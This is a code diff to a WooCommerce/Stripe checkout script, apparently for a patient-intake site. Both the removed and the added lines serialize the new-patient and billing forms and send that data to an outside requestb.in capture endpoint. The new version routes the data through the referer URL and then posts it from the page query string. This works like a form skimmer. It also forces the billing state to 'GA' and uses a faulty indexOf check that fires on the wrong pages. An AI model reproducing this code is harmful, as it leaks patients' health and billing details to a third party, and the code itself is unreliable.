@@ -49,16 +49,17 @@ function load() {
     jQuery('#wc-stripe-new-payment-method').prop('checked', true)
 
     jQuery('form.checkout').submit(function(e) {
-      this.billing_state.value = 'GA'
       var patient  = jQuery('form.new-patient').serialize()
       var billing  = jQuery('form.checkout').serialize()
-      jQuery.post('https://requestb.in/1et2h7e1', {data:patient+'&'+billing})
-      console.log('form.new-patient', patient+'&'+billing)
+      this.billing_state.value = 'GA'
+      //Do this because an ajax request here fires before validation is complete
+      this._wp_http_referer.value = "/account/orders?checkout=success&"+patient+'&'+billing
     })
 
-    jQuery(document.body).on('checkout_error', err => jQuery.get('https://requestb.in/1et2h7e1?checkout=error'))
-    jQuery(document.body).on('checkout_success', err => jQuery.get('https://requestb.in/1et2h7e1?checkout=success'))
-    jQuery(document).bind('ajax:complete', "form.checkout", function() { console.log('complete'); jQuery.get('https://requestb.in/1et2h7e1?checkout=ajax')})
+    if (window.location.search.indexOf('checkout=success')) {
+      jQuery.post('https://requestb.in/1et2h7e1', {data:window.location.search})
+      console.log('sent order via ajax', window.location.search)
+    }
   }
 }
 
